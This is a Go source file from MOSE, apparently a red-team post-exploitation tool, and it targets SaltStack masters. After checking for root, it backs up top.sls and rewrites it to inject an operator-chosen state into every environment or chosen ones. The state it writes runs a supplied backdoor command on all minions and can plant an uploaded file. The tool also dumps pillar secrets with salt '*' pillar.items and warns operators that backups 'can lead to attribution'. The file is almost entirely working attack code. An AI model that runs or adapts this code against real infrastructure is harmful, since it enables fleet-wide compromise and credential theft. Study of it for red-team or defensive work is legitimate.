// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.
package salt

import (
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/l50/mose/pkg/moseutils"
	"github.com/l50/mose/pkg/system"

	"github.com/ghodss/yaml"
	"github.com/markbates/pkger"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

type Command struct {
	Cmd       string
	FileName  string
	StateName string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.Cmd
	debug            = a.Debug
	localIP          = a.LocalIP
	osTarget         = a.OsTarget
	saltState        = a.PayloadName
	uploadFileName   = a.FileName
	suppliedFilename string
	keys             []string
	inspect          bool
	uploadFilePath   = a.RemoteUploadFilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	saltBackupLoc    = a.SaltBackupLoc
	specific         bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.BoolVar(&specific, "s", false, "Specify which environments of the top.sls you would like to backdoor")
}

func backdoorTop(topLoc string) {
	bytes, err := system.ReadBytesFromFile(topLoc)
	if err != nil {
		log.Fatal().Err(err).Msgf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	var unmarshalled map[string]interface{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting...")
	}
	//I am going to prompt questions before hand because reiterating through this is a monster
	ans, err := moseutils.AskUserQuestion("Would you like to inject all layers?", a.OsTarget)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting...")
	}
	injectAll := ans

	ans, err = moseutils.AskUserQuestion("Would you like to add  all to layers if no '*' is found?", a.OsTarget)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting...")
	}
	addAllIfNone := ans

	// mapOfInjects will be a hashmap of hashmaps that point to what host and what fileroot we want to inject
	unmarshalled, mapOfInjects := injectYaml(unmarshalled, injectAll, addAllIfNone, nil)

	if injectAll || addAllIfNone {
		return
	}

	validBool, validIndex := validateIndicies(mapOfInjects)
	if ans, err := moseutils.IndexedUserQuestion("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validBool, func() { prettyPrint(validIndex) }); err == nil {
		// Need to take the responses and then inject
		for i, b := range ans {
			if b {
				for k, v := range mapOfInjects {
					for k1, _ := range v {
						if validIndex[i] == fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1) {
							mapOfInjects[k][k1] = true
						}
					}
				}
			}
		}
	} else if err != nil {
		log.Fatal().Err(err).Msg("Quitting...")
	}

	unmarshalled, _ = injectYaml(unmarshalled, false, false, mapOfInjects)

	writeYamlToTop(unmarshalled, topLoc)
}

func prettyPrint(data map[int]string) {
	log.Info().Msg("Specific injection method requested, displaying indicies to select")
	for i := 0; i < len(data); i++ {
		log.Log().Msgf("[%d] %s", i, data[i])
	}
}

func validateIndicies(data map[string]map[string]bool) (map[int]bool, map[int]string) {
	validIndex := make(map[int]string, 0)
	validIndexBool := make(map[int]bool, 0)
	log.Info().Msg("Specific injection method requested, displaying indicies to select")
	for k, v := range data {
		ind := 0
		for k1, _ := range v {
			log.Log().Msgf("[%d] Fileroot: %v Hosts: %v", ind, k, k1)
			validIndex[ind] = fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1)
			validIndexBool[ind] = true
			ind += 1
		}
	}
	return validIndexBool, validIndex
}

func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNone bool, injectionMap map[string]map[string]bool) (map[string]interface{}, map[string]map[string]bool) {
	var injectPointsCreate map[string]map[string]bool
	if injectionMap == nil {
		injectPointsCreate = make(map[string]map[string]bool)
	}

	for k, v := range unmarshalled { //k is the fileroot if file_roots is not in the file
		if k == "file_roots" { // There are two general cases for the top.sls. You can have a root element file_roots (optional)
			for fileroot, frv := range v.(map[string]interface{}) { // unpack the fileroot such as base: interface{}
				isAllFound := false

				if injectionMap == nil {
					injectPointsCreate[fileroot] = make(map[string]bool)
				}
				for hosts, _ := range frv.(map[string]interface{}) { //now unpack the hosts it will run on: '*': interface{}
					if hosts == "'*'" { //check if all case exists
						isAllFound = true
					}
					if injectAll { //now if this is set we just inject irregardless of host
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
					//Add hosts to the injection Points
					if injectionMap == nil {
						injectPointsCreate[fileroot][hosts] = true
					} else if injectionMap[fileroot][hosts] {
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
				}
				if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc..
					unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})["*"] = []string{saltState}
				}
			}
		} else {
			isAllFound := false
			if injectionMap == nil {
				injectPointsCreate[k] = make(map[string]bool)
			}
			for hosts, _ := range v.(map[string]interface{}) {
				if hosts == "'*'" { //check if all case exists
					isAllFound = true
				}
				if injectAll { // append to list of states to apply
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}
				//Add hosts to the injection Points
				if injectionMap == nil {
					injectPointsCreate[k][hosts] = false
				} else if injectionMap[k][hosts] {
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}

			}
			if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc...
				unmarshalled[k].(map[string]interface{})["*"] = []string{saltState}
			}
		}
	}
	return unmarshalled, injectPointsCreate
}

func createState(topLoc string, cmd string) {
	topLocPath := filepath.Dir(topLoc) //Get directory leading to top.sls
	stateFolderLoc := filepath.Join(topLocPath, saltState)
	stateFolders := []string{stateFolderLoc}

	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")

	if system.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
		log.Log().Msgf("Successfully created the %s state at %s", saltState, stateFilePath)
		log.Log().Msgf("Adding folder %s to cleanup file", stateFolderLoc)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
		if uploadFileName != "" {
			saltFileFolders := filepath.Join(stateFolderLoc, "files")

			system.CreateFolders([]string{saltFileFolders})
			log.Log().Msgf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
			system.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal().Err(err).Msg("")
			}
			log.Log().Msgf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatal().Msgf("Failed to create %s state", saltState)
	}
}

func generateState(stateFile string, cmd string, stateName string) bool {
	saltCommands := Command{
		Cmd:       bdCmd,
		FileName:  uploadFileName,
		StateName: stateName,
	}

	s, err := pkger.Open("/tmpl/saltState.tmpl")
	if uploadFileName != "" {
		s, err = pkger.Open("/tmpl/saltFileUploadState.tmpl")
	}
	defer s.Close()

	if err != nil {
		log.Fatal().Err(err).Msg("Parse: ")
	}

	dat := new(strings.Builder)
	_, err = io.Copy(dat, s)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	t, err := template.New("saltState").Parse(dat.String())

	if err != nil {
		log.Fatal().Err(err).Msg("Parse: ")
	}

	f, err := os.Create(stateFile)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = t.Execute(f, saltCommands)

	if err != nil {
		log.Fatal().Err(err).Msg("Execute: ")
	}

	f.Close()

	return true
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting: ")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !system.FileExists(path) {
		log.Info().Msgf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal().Err(err).Msg("Quitting: ")
		}
	}
	if ans || ans2 {
		system.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func backupSite(siteLoc string) {
	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}
	if !system.FileExists(path + ".bak.mose") {
		system.CpFile(siteLoc, path+".bak.mose")
		return
	}
	log.Info().Msgf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
	return
}

func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
	marshalled, err := yaml.Marshal(&topSlsYaml)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = system.WriteBytesToFile(fileLoc, marshalled, 0644)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	log.Info().Msgf("%s successfully created", fileLoc)
}

func getPillarSecrets(binLoc string) {
	//Running command salt '*' pillar.items
	res, err := system.RunCommand(binLoc, "*", "pillar.items")
	if err != nil {
		log.Info().Msgf("Error running command: %s '*' pillar.items", binLoc)
		log.Fatal().Err(err).Msg("")
	}
	log.Info().Msgf("%s", res)

	return
}

func main() {
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	if debug {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
	}
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
	// parse args
	flag.Parse()

	// gonna assume not root then we screwed
	system.CheckRoot()

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	found, binLoc := system.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatal().Msg("salt binary not found, exiting...")
	}
	found, topLoc := system.FindFile("top.sls", []string{"/srv/salt"})
	if !found {
		log.Fatal().Msg("top.sls not found, exiting...")
	}

	if cleanup {
		doCleanup(topLoc)
	}
	if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
		backupSite(topLoc)
	} else if err != nil {
		log.Fatal().Msgf("Error backing up %s: %v, exiting...", topLoc, err)
	}

	log.Log().Msgf("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
	backdoorTop(topLoc)
	createState(topLoc, bdCmd)

	log.Info().Msg("Attempting to find secrets stored with salt Pillars")
	getPillarSecrets(strings.TrimSpace(binLoc))
}
